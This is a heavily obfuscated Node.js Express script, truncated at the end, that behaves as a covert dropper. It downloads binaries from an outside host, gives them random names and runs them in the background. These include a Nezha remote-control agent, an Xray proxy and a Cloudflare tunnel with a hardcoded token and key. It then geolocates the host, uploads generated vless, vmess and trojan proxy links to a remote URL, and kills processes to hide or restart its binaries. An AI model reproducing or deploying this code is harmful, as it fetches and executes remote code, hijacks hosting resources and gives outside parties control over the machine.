const _0x4f7718=_0x3331;(function(_0x484e4a,_0x535499){const _0x287c9c={_0x4b7eb4:0x90,_0x3c7f66:0x92,_0x129d5f:0xff,_0x32870e:0x9e},_0x29f685=_0x3331,_0x3689bd=_0x484e4a();while(!![]){try{const _0x35ff3d=-parseInt(_0x29f685(0x134))/0x1*(-parseInt(_0x29f685(_0x287c9c._0x4b7eb4))/0x2)+-parseInt(_0x29f685(0xd0))/0x3*(parseInt(_0x29f685(0x104))/0x4)+-parseInt(_0x29f685(0x9b))/0x5*(-parseInt(_0x29f685(0xa9))/0x6)+parseInt(_0x29f685(_0x287c9c._0x3c7f66))/0x7+parseInt(_0x29f685(0xc3))/0x8+parseInt(_0x29f685(0x113))/0x9*(-parseInt(_0x29f685(0xc2))/0xa)+-parseInt(_0x29f685(_0x287c9c._0x129d5f))/0xb*(-parseInt(_0x29f685(_0x287c9c._0x32870e))/0xc);if(_0x35ff3d===_0x535499)break;else _0x3689bd['push'](_0x3689bd['shift']());}catch(_0x12f817){_0x3689bd['push'](_0x3689bd['shift']());}}}(_0x4da9,0x96d08));const express=require('express'),app=express(),axios=require(_0x4f7718(0xe3)),os=require('os'),fs=require('fs'),path=require(_0x4f7718(0x131)),{promisify}=require(_0x4f7718(0xd5)),exec=promisify(require(_0x4f7718(0xcd))[_0x4f7718(0xc5)]),{execSync}=require(_0x4f7718(0xcd)),UPLOAD_URL=process[_0x4f7718(0xd1)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x4f7718(0xd1)][_0x4f7718(0x10b)]||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],FILE_PATH=process[_0x4f7718(0xd1)]['FILE_PATH']||_0x4f7718(0xe1),SUB_PATH=process[_0x4f7718(0xd1)]['SUB_PATH']||_0x4f7718(0xdf),PORT=process['env']['SERVER_PORT']||process[_0x4f7718(0xd1)][_0x4f7718(0x105)]||0xbb8,UUID=process[_0x4f7718(0xd1)]['UUID']||_0x4f7718(0xbb),NEZHA_SERVER=process[_0x4f7718(0xd1)]['NEZHA_SERVER']||_0x4f7718(0xe4),NEZHA_PORT=process[_0x4f7718(0xd1)][_0x4f7718(0x11a)]||'',NEZHA_KEY=process[_0x4f7718(0xd1)][_0x4f7718(0x135)]||'pFyT4RYC2IK0DmlyVyfEDZpiLYaZnBoh',ARGO_DOMAIN=process['env'][_0x4f7718(0xa8)]||_0x4f7718(0xb5),ARGO_AUTH=process[_0x4f7718(0xd1)][_0x4f7718(0xaf)]||'eyJhIjoiZDhhNzU0M2EwZDIyY2YwZTcxODQxODU3MzNlY2NmMmYiLCJ0IjoiM2E1NWZhOWYtZTk2MS00YWYzLWIxMmYtYTIyYTZiODk5Y2MwIiwicyI6IllqQXpOVEF4WTJFdFpXUmlNQzAwWW1GaExUZ3dOR010TmpGbVpqSTRNR1F4TnpWbCJ9',ARGO_PORT=process[_0x4f7718(0xd1)]['ARGO_PORT']||0x1f41,CFIP=process[_0x4f7718(0xd1)][_0x4f7718(0x129)]||_0x4f7718(0xfb),CFPORT=process[_0x4f7718(0xd1)]['CFPORT']||0x1bb,NAME=process[_0x4f7718(0xd1)][_0x4f7718(0x85)]||_0x4f7718(0x13a);!fs[_0x4f7718(0xb0)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x4f7718(0x101)](FILE_PATH+_0x4f7718(0xe7))):console[_0x4f7718(0x101)](FILE_PATH+_0x4f7718(0xde));function generateRandomName(){const _0x2fdb0f={_0x59612c:0xe6,_0x43ab99:0x146},_0x477d28=_0x4f7718,_0x4a8645=_0x477d28(_0x2fdb0f._0x59612c);let _0x1be0b0='';for(let _0x52a03d=0x0;_0x52a03d<0x6;_0x52a03d++){_0x1be0b0+=_0x4a8645[_0x477d28(_0x2fdb0f._0x43ab99)](Math[_0x477d28(0x147)](Math[_0x477d28(0x87)]()*_0x4a8645[_0x477d28(0x8b)]));}return _0x1be0b0;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x4f7718(0x116)](FILE_PATH,phpName),webPath=path[_0x4f7718(0x116)](FILE_PATH,webName),botPath=path[_0x4f7718(0x116)](FILE_PATH,botName),subPath=path[_0x4f7718(0x116)](FILE_PATH,_0x4f7718(0x123)),listPath=path[_0x4f7718(0x116)](FILE_PATH,_0x4f7718(0x141)),bootLogPath=path[_0x4f7718(0x116)](FILE_PATH,_0x4f7718(0x119)),configPath=path[_0x4f7718(0x116)](FILE_PATH,_0x4f7718(0xee));function deleteNodes(){const _0x4d20e9={_0xb05f59:0xbc,_0x556ec0:0x89,_0xb1873a:0x132,_0x5b04b6:0x8d,_0x1e2ddd:0xe5},_0x1d5189=_0x4f7718;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x3d770c;try{_0x3d770c=fs[_0x1d5189(_0x4d20e9._0xb05f59)](subPath,_0x1d5189(0x11f));}catch{return null;}const _0x5b929c=Buffer[_0x1d5189(_0x4d20e9._0x556ec0)](_0x3d770c,'base64')[_0x1d5189(0x107)]('utf-8'),_0x365df7=_0x5b929c[_0x1d5189(0xce)]('\x0a')[_0x1d5189(_0x4d20e9._0xb1873a)](_0x646efd=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x646efd));if(_0x365df7[_0x1d5189(0x8b)]===0x0)return;return axios[_0x1d5189(_0x4d20e9._0x5b04b6)](UPLOAD_URL+_0x1d5189(0xeb),JSON['stringify']({'nodes':_0x365df7}),{'headers':{'Content-Type':_0x1d5189(0x118)}})[_0x1d5189(_0x4d20e9._0x1e2ddd)](_0x5ad940=>{return null;}),null;}catch(_0x42340a){return null;}}function cleanupOldFiles(){const _0x4daa79={_0x23e41c:0xf3},_0xec795d={_0x107d24:0xfe,_0x512e6b:0xd9},_0x2750b3=_0x4f7718;try{const _0x28bb48=fs[_0x2750b3(_0x4daa79._0x23e41c)](FILE_PATH);_0x28bb48[_0x2750b3(0xab)](_0x16c376=>{const _0x49667f=_0x2750b3,_0x46e199=path['join'](FILE_PATH,_0x16c376);try{const _0x305d7e=fs[_0x49667f(0xad)](_0x46e199);_0x305d7e[_0x49667f(_0xec795d._0x107d24)]()&&fs[_0x49667f(_0xec795d._0x512e6b)](_0x46e199);}catch(_0x478ee4){}});}catch(_0x1e50f0){}}app[_0x4f7718(0xaa)]('/',function(_0x2074cf,_0x53a859){const _0x2f4c23=_0x4f7718;_0x53a859['send'](_0x2f4c23(0x88));});async function generateConfig(){const _0x332e61={_0x156032:0x140,_0x4c0e05:0xb3,_0x412808:0xae,_0x30b497:0xbe,_0x5563c6:0xba,_0x2f652a:0x120,_0x3f6701:0xb3,_0x426460:0xb3,_0x2f43fa:0x13b,_0x1b7863:0xdd,_0x257b5b:0x98,_0x13bf8b:0x108,_0x258263:0xdd,_0x1195b9:0xa1,_0x9f68d2:0x13b,_0xa0e72a:0x10e,_0xe08e09:0x86,_0x584ff6:0x9d,_0x2b1a64:0x138},_0xd5c023=_0x4f7718,_0x12b006={'log':{'access':_0xd5c023(0x140),'error':_0xd5c023(_0x332e61._0x156032),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0xd5c023(0x120),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0xd5c023(_0x332e61._0x4c0e05),'fallbacks':[{'dest':0xbb9},{'path':_0xd5c023(_0x332e61._0x412808),'dest':0xbba},{'path':_0xd5c023(0x98),'dest':0xbbb},{'path':_0xd5c023(_0x332e61._0x30b497),'dest':0xbbc}]},'streamSettings':{'network':_0xd5c023(_0x332e61._0x5563c6)}},{'port':0xbb9,'listen':_0xd5c023(0xdd),'protocol':_0xd5c023(_0x332e61._0x2f652a),'settings':{'clients':[{'id':UUID}],'decryption':_0xd5c023(_0x332e61._0x3f6701)},'streamSettings':{'network':_0xd5c023(0xba),'security':_0xd5c023(0xb3)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0xd5c023(0x120),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0xd5c023(_0x332e61._0x426460),'wsSettings':{'path':_0xd5c023(0xae)}},'sniffing':{'enabled':!![],'destOverride':[_0xd5c023(0x108),_0xd5c023(_0x332e61._0x2f43fa),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0xd5c023(_0x332e61._0x1b7863),'protocol':_0xd5c023(0xed),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0xd5c023(_0x332e61._0x257b5b)}},'sniffing':{'enabled':!![],'destOverride':[_0xd5c023(_0x332e61._0x13bf8b),_0xd5c023(_0x332e61._0x2f43fa),_0xd5c023(0x10e)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0xd5c023(_0x332e61._0x258263),'protocol':_0xd5c023(_0x332e61._0x1195b9),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0xd5c023(0xb3),'wsSettings':{'path':_0xd5c023(0xbe)}},'sniffing':{'enabled':!![],'destOverride':['http',_0xd5c023(_0x332e61._0x9f68d2),_0xd5c023(_0x332e61._0xa0e72a)],'metadataOnly':![]}}],'dns':{'servers':[_0xd5c023(0xb4)]},'outbounds':[{'protocol':_0xd5c023(_0x332e61._0xe08e09),'tag':_0xd5c023(_0x332e61._0x584ff6)},{'protocol':_0xd5c023(_0x332e61._0x2b1a64),'tag':'block'}]};fs['writeFileSync'](path[_0xd5c023(0x116)](FILE_PATH,_0xd5c023(0xee)),JSON['stringify'](_0x12b006,null,0x2));}function getSystemArchitecture(){const _0x27fef8={_0x564709:0x11e,_0x3e8c35:0xf1},_0x505feb=_0x4f7718,_0x580d86=os[_0x505feb(_0x27fef8._0x564709)]();return _0x580d86===_0x505feb(0xb8)||_0x580d86===_0x505feb(0x100)||_0x580d86===_0x505feb(_0x27fef8._0x3e8c35)?_0x505feb(0xb8):'amd';}function downloadFile(_0x363d3b,_0x137632,_0x1acab9){const _0x451cb2={_0x5cb77a:0x8c,_0x5ee38c:0xaa},_0x2b1b50={_0x24b67f:0x8e},_0x1fc326={_0x56c1cb:0x115},_0x144110=_0x4f7718,_0xd63154=_0x363d3b;!fs[_0x144110(0xb0)](FILE_PATH)&&fs[_0x144110(_0x451cb2._0x5cb77a)](FILE_PATH,{'recursive':!![]});const _0x375033=fs[_0x144110(0xb1)](_0xd63154);axios({'method':_0x144110(_0x451cb2._0x5ee38c),'url':_0x137632,'responseType':_0x144110(0xa7)})[_0x144110(0x99)](_0x468518=>{const _0x1465b4={_0x51e31a:0xe2,_0x12e508:0x8e,_0x190a5f:0xfc,_0x721efa:0x10a},_0x29ef57={_0x23ec80:0xf5,_0x365d79:0x101,_0x47e893:0xec},_0x34982c=_0x144110;_0x468518[_0x34982c(_0x1fc326._0x56c1cb)]['pipe'](_0x375033),_0x375033['on']('finish',()=>{const _0x33cd41=_0x34982c;_0x375033[_0x33cd41(_0x29ef57._0x23ec80)](),console[_0x33cd41(_0x29ef57._0x365d79)]('Download\x20'+path[_0x33cd41(0x8e)](_0xd63154)+_0x33cd41(_0x29ef57._0x47e893)),_0x1acab9(null,_0xd63154);}),_0x375033['on'](_0x34982c(0x13c),_0x461efd=>{const _0x1d905d=_0x34982c;fs[_0x1d905d(0x12f)](_0xd63154,()=>{});const _0x501049=_0x1d905d(_0x1465b4._0x51e31a)+path[_0x1d905d(_0x1465b4._0x12e508)](_0xd63154)+_0x1d905d(_0x1465b4._0x190a5f)+_0x461efd[_0x1d905d(_0x1465b4._0x721efa)];console[_0x1d905d(0x13c)](_0x501049),_0x1acab9(_0x501049);});})['catch'](_0x3ca7b2=>{const _0x5431d6=_0x144110,_0x13749f=_0x5431d6(0xe2)+path[_0x5431d6(_0x2b1b50._0x24b67f)](_0xd63154)+'\x20failed:\x20'+_0x3ca7b2[_0x5431d6(0x10a)];console['error'](_0x13749f),_0x1acab9(_0x13749f);});}function _0x3331(_0xb4b8d4,_0x4028ab){const _0x4da960=_0x4da9();return _0x3331=function(_0x333162,_0x5e0ce6){_0x333162=_0x333162-0x81;let _0x3bac3f=_0x4da960[_0x333162];return _0x3bac3f;},_0x3331(_0xb4b8d4,_0x4028ab);}async function downloadFilesAndRun(){const _0x5e589e={_0x15a50c:0x101,_0x241beb:0x109,_0x793982:0xea,_0x591a8c:0x95,_0x209ce1:0x8f,_0x5f16f1:0xb9,_0x5ce905:0x91,_0x4a8883:0x102,_0x3d8394:0x9a,_0x5d2259:0xf8,_0x3e3495:0xd2,_0x1c27de:0x101,_0x5f382b:0x13d,_0x5e9565:0xf0,_0x3aa388:0x84,_0x2bd668:0x13c,_0x38ecdd:0xa5,_0x21711c:0xdc,_0xfd4251:0xb0,_0x3d66aa:0xef,_0x3fa4e5:0x130,_0x52f9d0:0x106,_0x2e01f3:0x13c},_0x2e5946={_0x16052b:0xc9},_0x353214=_0x4f7718,_0x10350=getSystemArchitecture(),_0x128048=getFilesForArchitecture(_0x10350);if(_0x128048[_0x353214(0x8b)]===0x0){console[_0x353214(_0x5e589e._0x15a50c)](_0x353214(_0x5e589e._0x241beb));return;}const _0x3d2b02=_0x128048[_0x353214(_0x5e589e._0x793982)](_0x24698a=>{return new Promise((_0x4bd25c,_0x480b6d)=>{const _0x3b95e0=_0x3331;downloadFile(_0x24698a[_0x3b95e0(0xb6)],_0x24698a[_0x3b95e0(_0x2e5946._0x16052b)],(_0x10f3ac,_0xb51c42)=>{_0x10f3ac?_0x480b6d(_0x10f3ac):_0x4bd25c(_0xb51c42);});});});try{await Promise['all'](_0x3d2b02);}catch(_0x70141d){console[_0x353214(0x13c)](_0x353214(_0x5e589e._0x591a8c),_0x70141d);return;}function _0x56b12f(_0x1fd9cd){const _0x287d38={_0x474856:0x142,_0x33c252:0x101},_0x16e2c2=0x1fd;_0x1fd9cd['forEach'](_0x251bda=>{fs['existsSync'](_0x251bda)&&fs['chmod'](_0x251bda,_0x16e2c2,_0x993cf9=>{const _0x33474a=_0x3331;_0x993cf9?console['error'](_0x33474a(_0x287d38._0x474856)+_0x251bda+':\x20'+_0x993cf9):console[_0x33474a(_0x287d38._0x33c252)](_0x33474a(0x137)+_0x251bda+':\x20'+_0x16e2c2[_0x33474a(0x107)](0x8));});});}const _0x2827d3=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x56b12f(_0x2827d3);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x465826=NEZHA_SERVER[_0x353214(_0x5e589e._0x209ce1)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x4210d9=new Set([_0x353214(0x136),_0x353214(_0x5e589e._0x5f16f1),_0x353214(0xd7),'2087',_0x353214(0x11b),_0x353214(0xb2)]),_0x7cb57=_0x4210d9[_0x353214(0x145)](_0x465826)?_0x353214(0xc1):_0x353214(0x10c),_0x2cc041=_0x353214(0x127)+NEZHA_KEY+_0x353214(0x82)+NEZHA_SERVER+_0x353214(_0x5e589e._0x5ce905)+_0x7cb57+_0x353214(_0x5e589e._0x4a8883)+UUID;fs[_0x353214(0xa4)](path['join'](FILE_PATH,_0x353214(_0x5e589e._0x3d8394)),_0x2cc041);const _0x1a5a55=_0x353214(_0x5e589e._0x5d2259)+phpPath+_0x353214(0xd4)+FILE_PATH+_0x353214(_0x5e589e._0x3e3495);try{await exec(_0x1a5a55),console[_0x353214(_0x5e589e._0x1c27de)](phpName+_0x353214(_0x5e589e._0x5f382b)),await new Promise(_0x41b566=>setTimeout(_0x41b566,0x3e8));}catch(_0x1c54d7){console[_0x353214(0x13c)](_0x353214(0xd6)+_0x1c54d7);}}else{let _0x485fda='';const _0x25a9f2=[_0x353214(0x136),_0x353214(0xb9),'2096',_0x353214(_0x5e589e._0x5e9565),'2083',_0x353214(0xb2)];_0x25a9f2[_0x353214(0x8f)](NEZHA_PORT)&&(_0x485fda='--tls');const _0x292fdb=_0x353214(_0x5e589e._0x5d2259)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x353214(0x93)+NEZHA_KEY+'\x20'+_0x485fda+_0x353214(_0x5e589e._0x3aa388);try{await exec(_0x292fdb),console[_0x353214(_0x5e589e._0x1c27de)](npmName+_0x353214(0x13d)),await new Promise(_0x1d70e2=>setTimeout(_0x1d70e2,0x3e8));}catch(_0xf5bd55){console[_0x353214(_0x5e589e._0x2bd668)](_0x353214(0x10f)+_0xf5bd55);}}}else console[_0x353214(0x101)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x35f291='nohup\x20'+webPath+_0x353214(_0x5e589e._0x38ecdd)+FILE_PATH+_0x353214(0x83);try{await exec(_0x35f291),console[_0x353214(_0x5e589e._0x1c27de)](webName+'\x20is\x20running'),await new Promise(_0x5e58aa=>setTimeout(_0x5e58aa,0x3e8));}catch(_0x2f0e18){console[_0x353214(_0x5e589e._0x2bd668)](_0x353214(_0x5e589e._0x21711c)+_0x2f0e18);}if(fs[_0x353214(_0x5e589e._0xfd4251)](botPath)){let _0x2003b8;if(ARGO_AUTH[_0x353214(_0x5e589e._0x3d66aa)](/^[A-Z0-9a-z=]{120,250}$/))_0x2003b8='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x353214(0xef)](/TunnelSecret/)?_0x2003b8=_0x353214(0x111)+FILE_PATH+_0x353214(0x124):_0x2003b8=_0x353214(0x12d)+FILE_PATH+_0x353214(_0x5e589e._0x3fa4e5)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x2003b8+_0x353214(_0x5e589e._0x52f9d0)),console['log'](botName+_0x353214(0x13d)),await new Promise(_0x246ccb=>setTimeout(_0x246ccb,0x7d0));}catch(_0x253b17){console[_0x353214(_0x5e589e._0x2e01f3)]('Error\x20executing\x20command:\x20'+_0x253b17);}}await new Promise(_0x127de7=>setTimeout(_0x127de7,0x1388));}function getFilesForArchitecture(_0x4c8378){const _0x52c5ba={_0x4d59f2:0xb8,_0x3fba14:0x9f,_0x468acd:0xe8,_0x798cd5:0x128,_0xdebb13:0xb8,_0x4c7784:0xfd,_0x32c971:0x94,_0x10187d:0x128},_0xe26065=_0x4f7718;let _0x3c0a1c;_0x4c8378===_0xe26065(_0x52c5ba._0x4d59f2)?_0x3c0a1c=[{'fileName':webPath,'fileUrl':_0xe26065(_0x52c5ba._0x3fba14)},{'fileName':botPath,'fileUrl':_0xe26065(0xa3)}]:_0x3c0a1c=[{'fileName':webPath,'fileUrl':_0xe26065(0xcc)},{'fileName':botPath,'fileUrl':_0xe26065(0x12b)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x60702a=_0x4c8378==='arm'?'https://arm64.ssss.nyc.mn/agent':_0xe26065(_0x52c5ba._0x468acd);_0x3c0a1c[_0xe26065(_0x52c5ba._0x798cd5)]({'fileName':npmPath,'fileUrl':_0x60702a});}else{const _0xba4d99=_0x4c8378===_0xe26065(_0x52c5ba._0xdebb13)?_0xe26065(_0x52c5ba._0x4c7784):_0xe26065(_0x52c5ba._0x32c971);_0x3c0a1c[_0xe26065(_0x52c5ba._0x10187d)]({'fileName':phpPath,'fileUrl':_0xba4d99});}}return _0x3c0a1c;}function argoType(){const _0x167740={_0x48e2d7:0xe0,_0x2d4328:0x8f,_0x5506a8:0x125,_0x1d1b01:0x81,_0x42a5d8:0x116,_0xe7f043:0x13e,_0x3cd47d:0x101},_0x200a2c=_0x4f7718;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x200a2c(0x101)](_0x200a2c(_0x167740._0x48e2d7));return;}if(ARGO_AUTH[_0x200a2c(_0x167740._0x2d4328)](_0x200a2c(_0x167740._0x5506a8))){fs[_0x200a2c(0xa4)](path[_0x200a2c(0x116)](FILE_PATH,_0x200a2c(_0x167740._0x1d1b01)),ARGO_AUTH);const _0x3c8a6d='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH['split']('\x22')[0xb]+_0x200a2c(0x117)+path[_0x200a2c(_0x167740._0x42a5d8)](FILE_PATH,_0x200a2c(0x81))+_0x200a2c(0x9c)+ARGO_DOMAIN+_0x200a2c(_0x167740._0xe7f043)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs['writeFileSync'](path[_0x200a2c(0x116)](FILE_PATH,_0x200a2c(0xf6)),_0x3c8a6d);}else console[_0x200a2c(_0x167740._0x3cd47d)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0xce33d4={_0x2fd910:0xdb,_0x3c85e9:0x116,_0x2fe0e7:0x8b,_0x351b4a:0x101,_0x37a3c4:0x101,_0x1006f:0x12d,_0x2138da:0x130,_0x2c6044:0xf8,_0x75cb1a:0x106,_0x11e9fd:0x13c},_0x43d7e6={_0x39cf9d:0xbf,_0x4f97d4:0x115,_0x41e6fe:0x115,_0x40b4ae:0x115,_0x3b9385:0x115,_0x42662a:0xb7,_0x4fffe7:0x115},_0x397231={_0x787e35:0xcf,_0x30eed6:0x122},_0x342595={_0xe433ae:0xef,_0x5b1560:0xf2},_0x329fcf=_0x4f7718;let _0x4ddbdc;if(ARGO_AUTH&&ARGO_DOMAIN)_0x4ddbdc=ARGO_DOMAIN,console[_0x329fcf(0x101)](_0x329fcf(_0xce33d4._0x2fd910),_0x4ddbdc),await _0x12f846(_0x4ddbdc);else try{const _0x30d73f=fs[_0x329fcf(0xbc)](path[_0x329fcf(_0xce33d4._0x3c85e9)](FILE_PATH,'boot.log'),_0x329fcf(0x11f)),_0x384347=_0x30d73f['split']('\x0a'),_0x3bede4=[];_0x384347['forEach'](_0x14f676=>{const _0x2e62c2=_0x329fcf,_0x36d701=_0x14f676[_0x2e62c2(_0x342595._0xe433ae)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x36d701){const _0x18e181=_0x36d701[0x1];_0x3bede4[_0x2e62c2(_0x342595._0x5b1560)](_0x18e181);}});if(_0x3bede4[_0x329fcf(_0xce33d4._0x2fe0e7)]>0x0)_0x4ddbdc=_0x3bede4[0x0],console[_0x329fcf(_0xce33d4._0x351b4a)]('ArgoDomain:',_0x4ddbdc),await _0x12f846(_0x4ddbdc);else{console[_0x329fcf(_0xce33d4._0x37a3c4)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x329fcf(0xd9)](path[_0x329fcf(_0xce33d4._0x3c85e9)](FILE_PATH,'boot.log'));async function _0x298c42(){const _0x4f9e42=_0x329fcf;try{process[_0x4f9e42(_0x397231._0x787e35)]===_0x4f9e42(0x110)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x4f9e42(_0x397231._0x30eed6)):await exec(_0x4f9e42(0xf7)+botName['charAt'](0x0)+']'+botName[_0x4f9e42(0xa2)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x37d193){}}_0x298c42(),await new Promise(_0x593270=>setTimeout(_0x593270,0xbb8));const _0x3e337e=_0x329fcf(_0xce33d4._0x1006f)+FILE_PATH+_0x329fcf(_0xce33d4._0x2138da)+ARGO_PORT;try{await exec(_0x329fcf(_0xce33d4._0x2c6044)+botPath+'\x20'+_0x3e337e+_0x329fcf(_0xce33d4._0x75cb1a)),console[_0x329fcf(0x101)](botName+'\x20is\x20running'),await new Promise(_0x124d70=>setTimeout(_0x124d70,0xbb8)),await extractDomains();}catch(_0x52574c){console[_0x329fcf(_0xce33d4._0x11e9fd)](_0x329fcf(0x11d)+_0x52574c);}}}catch(_0x435d38){console['error']('Error\x20reading\x20boot.log:',_0x435d38);}async function _0x27ab43(){const _0x456c27=_0x329fcf;try{const _0x2b481a=await axios[_0x456c27(0xaa)](_0x456c27(_0x43d7e6._0x39cf9d),{'timeout':0xbb8});if(_0x2b481a[_0x456c27(_0x43d7e6._0x4f97d4)]&&_0x2b481a[_0x456c27(_0x43d7e6._0x41e6fe)][_0x456c27(0xc6)]&&_0x2b481a['data'][_0x456c27(0x96)])return _0x2b481a[_0x456c27(0x115)]['country_code']+'_'+_0x2b481a[_0x456c27(0x115)][_0x456c27(0x96)];}catch(_0xe1dbd7){try{const _0x4df319=await axios['get'](_0x456c27(0x12c),{'timeout':0xbb8});if(_0x4df319[_0x456c27(_0x43d7e6._0x40b4ae)]&&_0x4df319[_0x456c27(_0x43d7e6._0x41e6fe)][_0x456c27(0xac)]===_0x456c27(0x121)&&_0x4df319['data']['countryCode']&&_0x4df319[_0x456c27(_0x43d7e6._0x3b9385)]['org'])return _0x4df319[_0x456c27(_0x43d7e6._0x41e6fe)][_0x456c27(_0x43d7e6._0x42662a)]+'_'+_0x4df319[_0x456c27(_0x43d7e6._0x4fffe7)][_0x456c27(0x96)];}catch(_0x1c658a){}}return _0x456c27(0x12a);}async function _0x12f846(_0x5a6769){const _0x3b1b42=await _0x27ab43(),_0x578b9c=NAME?NAME+'-'+_0x3b1b42:_0x3b1b42;return new Promise(_0x55d9fd=>{const _0x49d5d2={_0x54d834:0xb3,_0x2d1d82:0x112,_0x4bc504:0x10d,_0x13b0c9:0x139,_0x3f5073:0xd8,_0x12453f:0x101,_0x2b0a6e:0xa4,_0x380fbb:0xc0};setTimeout(()=>{const _0x1b7adf={_0x1622c3:0x89,_0x184b1e:0x107,_0xfc67ee:0x10d,_0x4e4af5:0x12e},_0x35f10b=_0x3331,_0x2256eb={'v':'2','ps':''+_0x578b9c,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x35f10b(_0x49d5d2._0x54d834),'host':_0x5a6769,'path':_0x35f10b(0x148),'tls':_0x35f10b(0x13b),'sni':_0x5a6769,'alpn':'','fp':'firefox'},_0x381355=_0x35f10b(_0x49d5d2._0x2d1d82)+UUID+'@'+CFIP+':'+CFPORT+_0x35f10b(0x126)+_0x5a6769+_0x35f10b(0x139)+_0x5a6769+_0x35f10b(0xd3)+_0x578b9c+_0x35f10b(0xda)+Buffer[_0x35f10b(0x89)](JSON[_0x35f10b(0x11c)](_0x2256eb))[_0x35f10b(0x107)](_0x35f10b(_0x49d5d2._0x4bc504))+_0x35f10b(0xf9)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x5a6769+_0x35f10b(_0x49d5d2._0x13b0c9)+_0x5a6769+_0x35f10b(_0x49d5d2._0x3f5073)+_0x578b9c+_0x35f10b(0xfa);console[_0x35f10b(_0x49d5d2._0x12453f)](Buffer[_0x35f10b(0x89)](_0x381355)[_0x35f10b(0x107)]('base64')),fs[_0x35f10b(_0x49d5d2._0x2b0a6e)](subPath,Buffer[_0x35f10b(0x89)](_0x381355)['toString'](_0x35f10b(0x10d))),console['log'](FILE_PATH+_0x35f10b(_0x49d5d2._0x380fbb)),uploadNodes(),app[_0x35f10b(0xaa)]('/'+SUB_PATH,(_0xb78c5b,_0x2a08f5)=>{const _0x59f102=_0x35f10b,_0x399138=Buffer[_0x59f102(_0x1b7adf._0x1622c3)](_0x381355)[_0x59f102(_0x1b7adf._0x184b1e)](_0x59f102(_0x1b7adf._0xfc67ee));_0x2a08f5[_0x59f102(_0x1b7adf._0x4e4af5)](_0x59f102(0xca),_0x59f102(0xcb)),_0x2a08f5[_0x59f102(0x149)](_0x399138);}),_0x55d9fd(_0x381355);},0x7d0);});}}async function uploadNodes(){const _0x450cd1={_0x581f1d:0x97,_0x3fb855:0x13f,_0x1f5dd0:0x132,_0x493a64:0x11c,_0x5b4975:0x8d,_0x40aeb2:0x101},_0x3af0fb=_0x4f7718;if(UPLOAD_URL&&PROJECT_URL){const _0x5d2032=PROJECT_URL+'/'+SUB_PATH,_0x5f20b9={'subscription':[_0x5d2032]};try{const _0x13d1a4=await axios[_0x3af0fb(0x8d)](UPLOAD_URL+_0x3af0fb(_0x450cd1._0x581f1d),_0x5f20b9,{'headers':{'Content-Type':_0x3af0fb(0x118)}});return _0x13d1a4&&_0x13d1a4[_0x3af0fb(0xac)]===0xc8?(console[_0x3af0fb(0x101)]('Subscription\x20uploaded\x20successfully'),_0x13d1a4):null;}catch(_0x54a657){if(_0x54a657['response']){if(_0x54a657[_0x3af0fb(_0x450cd1._0x3fb855)][_0x3af0fb(0xac)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x3e45f7=fs[_0x3af0fb(0xbc)](listPath,_0x3af0fb(0x11f)),_0x4855b5=_0x3e45f7[_0x3af0fb(0xce)]('\x0a')[_0x3af0fb(_0x450cd1._0x1f5dd0)](_0x4807d9=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3af0fb(0xa0)](_0x4807d9));if(_0x4855b5[_0x3af0fb(0x8b)]===0x0)return;const _0x87af3e=JSON[_0x3af0fb(_0x450cd1._0x493a64)]({'nodes':_0x4855b5});try{const _0x257afc=await axios[_0x3af0fb(_0x450cd1._0x5b4975)](UPLOAD_URL+'/api/add-nodes',_0x87af3e,{'headers':{'Content-Type':_0x3af0fb(0x118)}});return _0x257afc&&_0x257afc['status']===0xc8?(console[_0x3af0fb(_0x450cd1._0x40aeb2)](_0x3af0fb(0x103)),_0x257afc):null;}catch(_0x5a7a2d){return null;}}else return;}}function cleanFiles(){const _0x555e84={_0xd31c3a:0xf2,_0x237988:0xf2,_0x1c8693:0xa6},_0x43f032={_0x32b259:0x101};setTimeout(()=>{const 